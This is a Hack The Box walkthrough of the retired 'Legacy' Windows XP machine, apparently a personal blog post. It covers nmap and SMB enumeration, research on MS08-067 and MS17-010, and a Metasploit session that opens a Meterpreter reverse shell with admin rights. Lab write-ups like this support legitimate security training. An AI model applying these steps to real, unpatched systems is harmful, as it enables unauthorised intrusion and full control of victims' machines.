--- 
layout: post 
title: Legacy HTB Writeup
date: 2020-05-15 018:00:00 -0400 
categories: InfoSec 
---


The Legacy HTB machine was one of the first HTB machines I ever broke into. It's a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It's a good start for practicing for the OSCP.  

![Website Screenshot](/assets/img/Walkthroughs/Legacy/Website_shot.png)

If this writeup isn't enough, HTB does include [a writeup](https://www.hackthebox.eu/home/machines/profile/2) on the site. There are also plenty of videos online how to do this box as well. 

**Okay let's get into it**


### Scanning the machine
So from HTB we already know the IP address is <code>10.10.10.4</code> so as long as our OpenVPN connection is setup we should be able to start banging on it.  

I'm going to scan this in a few different ways. First let's do a basic nmap. 

#### Basic nmap
```
nmap 10.10.10.4
```
or in case it has trouble
```
nmap -Pn 10.10.10.4
```

![Basic nmap scan](/assets/img/Walkthroughs/Legacy/basic_nmap.png) 
 

This scan will give us some basic information. It's good to do this scan first to see if there are any ports you can start to enumearte while waiting for larger scans.  
From this we can guess it might have something to do with SMB. How?  
**SMB**  
- [x] Has older SMB port 139. SMB used to run on 139 on top of netbios
- [x] Has newer SMB port 445. After Windows 2000, SMB was moved to this port.  
It's not enough for full confidence but it's enough to start to see where we might be going with this.  

 Let's run a couple bigger scans. 

**Note:** The next two scans can be run back to back but if you run the nmapAutomator.sh script, it includes the nmap scan I'm about to show you. 

#### "Big nmap" scan
I personally call this the big nmap. It's a scan that will scan all ports, and run anything it can against it.  
```
nmap -T4 -A -p- 10.10.10.4
```
I kept <code>-Pn</code> just because.

![big nmap ](/assets/img/Walkthroughs/Legacy/big_nmap.png) 

Before we run the next scan, lets go ahead and see what we can find from this. 
- Still looks like SMB
- SMB Security looks weak - <code>message_signing: disabled</code>
- Evidence that it is an older Windows machine, most likely XP. 
- Computer name is 'Legacy'
- Workgroup is 'HTB'
- Maybe possible to enumerate Netbios
- Has directory services enabled

Okay let's run the nmapAutomator.sh scan. 

#### nmapAutomator.sh
Before we run this scan, let's talk about it a bit.  
nmapAutomator.sh is a bash script written by Github users **21y4d, austinsonger, and Knowledge_Wisdom_Understanding** and can be found on [Github here.](https://github.com/21y4d/nmapAutomator)  

It will run a handful of scans at the same time for you including: 
- sslscan
- nikto
- wpscan
- smbmap
- etc. 

So let's run a full scan and see how it goes.  
The scan is quite lengthy so I won't be posting a screenshot of the whole thing, but if you want to see the whole scan, you can watch it here. [![asciicast](https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v.svg)](https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v)  

This scan basically just confirmed what we found from previous scans. But it did give some particularly interesting information on the SMB situation.
![SMB Vulnerabilities](/assets/img/Walkthroughs/Legacy/nmapauto_vulns.png)  

So now we know that this machine has two CVEs marked as vulnerable. 
- CVE-2008-4250
- CVE-2017-0143

At this point we could probably start poking at these CVEs but let's try to dig in a bit further before attacking the machine.  

#### Netbios enumeration
So with netbios there are a couple ways we can enumerate it. The first way is to run <code>nbtscan</code> on it to see what services we can see. We are looking for information about it being connected to a domain or a some sort of file server service. 
```
nbtscan -vh 10.10.10.4
```
After running this we see that it in fact has a file server service running as well as a few others listed. This is good information for us.  

![Nbtscan](/assets/img/Walkthroughs/Legacy/nbtscan.png)



#### SMB enumeration
Okay so when we ran our big nmap scan we got plenty of information on SMB but let's just run some SMB specific enumerations real fast just for the heck of it. Let's start with smbclient. 

```
smbclient -L \\\\10.10.10.4\\\
smbclient -N -L \\\10.10.10.4\\

```
smbclient is a small application similar to FTP. It may allow you to view files from the server. It also allows to put files on the server, view files, etc. In some cases you will be able to log in anonymously. 

![smbclient](/assets/img/Walkthroughs/Legacy/smbclient.png)

**EDIT**  

>Alright so. When I wrote this post I didn't realize what this error was coming from. After doing some research I realized that my .conf file that handles smb client was configured to run a newer version of SMB. So, if you run into this, I have a quick writeup on how to fix it [here](/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html)  
>
>![SMBclientUpdated](/assets/img/Walkthroughs/Legacy/smbclientupdated.png)  
>
>After changing the conf file. This is what it looked like. To be expected. Invalid parameter means it doesn't like a blank password. 



**Note:** *smbmap is also a great tool for enumerating SMB, in paticular when working with Active Directory or domains.*

Another way to enumerate SMB is to use nmap with the SMB script. We have already done this in the big nmap scan we did previously, but if you wanted to run it again it would look like this. 

```
nmap -p 445 --script smb-os-discovery 10.10.10.4
```

Lastly, you should know that Metasploit has amazing auxiliary scanners. You can use Metasploit to search keywords and then go from there. You'll find an auxiliary module called ``` auxiliary/scanner/smb/smb_version``` that is useful here. The steps here are basic. 
- ```use``` and the module name. 
- ```options``` to view what needs to be set
- ```set``` each option as needed. 
- ```run``` to run the module. 

```
msf5 > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
SMBDomain  .                no        The Windows domain to use for authentication
SMBPass                     no        The password for the specified username
SMBUser                     no        The username to authenticate as
THREADS    1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Sweet so this specifically tells us a few things. 
- Windows XP SP3
- Host name is LEGACY
- Workgroup is called HTB  

This is pretty good information to have. 
### Digging into the CVEs

So there are two CVEs that we noticed earlier. There are loads of ways to search these to find out more information about the machine. I always suggest doing a few different searches to find out basic information and also confirm what you've read. If you're just looking at one post, you're probably missing out on a lot of information. Below is a bit of research I did on both CVEs. I've included the links I felt were important as well.  

Before we hit Google, lets try a little **Searchsploit**... starting with **CVE-2008-4250**

#### CVE-2008-4250

**Searchsploit**
![MS08-067 SearchSploit](/assets/img/Walkthroughs/Legacy/SearchSploit-MS08-067.png)  

Notice that when I searched for it by CVE I got nothing. That's why searching in different places is so important. I knew to also search MS08-067 because of this next page...  

**CVEDetails.com**  

[CVE Details link](https://www.cvedetails.com/cve/CVE-2008-4250/)  
![CVE Screenshot](/assets/img/Walkthroughs/Legacy/CVE-Details-2008-4250.png)   
The CVE Details page always gives loads of information. Here is the take away. 

- Allows for Remote Code Execution - *Exactly what we want to hear when trying to gain initial access*
- Has Metasploit Module ;)
- Works on older Windows Servers between 2000-2008
- Highest level of risk - CVSS Score of 10
- Authentication not required for exploit
- Complexity is low
- Access gained - Admin  
- Also known as MS08-067 (This is useful for doing further research)  

So in theory a Metasploit module can **do the work for us, get us in**, and not only that but already **be admin level**. Note taken!  

**Exploit-db.com**  

[Exploit-db link](https://www.exploit-db.com/exploits/7132)  

![EDB-7132](/assets/img/Walkthroughs/Legacy/EDB-7132.png)  


Okay so this is literally the exploit for this particular vulnerability published online. Great. From the site we can tell that 
- Is Verified by EDB to work.
- Written in python
- Has some python dependencies 
- Takes arguments based on which OS you're targeting, i.e. has multiple payloads
- Sets up a listener on port 4444
- exploit portion of the script is shellcode for a portbind that came from Metasploit. 
- Was listed '7132.py' in our searchsploit results.

If our enumeration has been correct so far, this is almost a stopping point. We know the OS, SMB version, the CVE, and the exploit. And everything lines up really well. Not a lot of chances for failure here. But always keep reading before firing something off, your little copy and paste pew pew could really wreck a machine if you're not careful.  


#### CVE-2017-0143
Okay so before we dig into this. Think back to 2017 and try to remember some sort of massive worldwide scare involving SMB... do you remember? Yeahhhhhh. WannaCry? This bad boy right here is also known as MS17-010. I imagine this machine could be broken into using either of these CVEs but I chased the above method. But for reference, here are some links.  

https://www.exploit-db.com/exploits/41891  
https://www.cvedetails.com/cve/CVE-2017-0143/  


#### Exploitation and Gaining Access

**Trying out CVE-2008-4250 aka MS08-067**  

So this exploit has two methods, Metasploit and of course finding the exploit online. Or I mean... if you're a big shot, maybe develop your own exploit.  

#### Manual Exploit
>Adding this section soon


#### Metasploit
After I saw that Metasploit was an option here, I quickly fired a Metasploit missile at this silly boy. You can use the search function in Metasploit to find a module called ```exploit/windows/smb/ms08_067_netapi```. It was super easy to run. Note that sometimes exploits revolving around MS08-067 and MS17-010 can be finicky. You might have to try it a couple times. Here is what it looked like in Metasploit.  

- Search for the exploit
- use the ```use``` command and the name of the exploit
- check the options with ```options```
- set necessary ```options```
- ```run```


```
msf5 > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT    445              yes       The SMB service port (TCP)
SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

Id  Name
--  ----
0   Automatic Targeting

msf5 exploit(windows/smb/ms08_067_netapi) > rhosts 10.10.10.4
[-] Unknown command: rhosts.
msf5 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
rhosts => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.4:1031) at 2020-05-11 23:01:23 -0400

meterpreter >
```

Boom you've got a meterpreter shell and if you check, you're big boy admin with all the rights in the world. Yes this hack was pretty easy, yes it's based off of a massive vulnerability that hit the news which means every IT guy and gal across the globe knows about it and hopefully that means they are all patched up. But. That is wishful thinking. I have to say the biggest value in this is that is was a really rewarding hack. It was my first HTB and for a lot of folks reading this, it's probably theirs as well. Or... it should be I would say. There is massive value in doing easy boxes like this for your confidence. It gives so much momentum that tackling harder boxes are just a little bit less scary. SO. That's it. I hope this helps. If I said something stupid or lied or anything else, feel free to reach out.  
 Twitter - [@mehhsecurity](https://twitter.com/mehhsecurity)  
 Email is **hi.imzackjones@gmail.com**  


Cheers, 
Zack. 






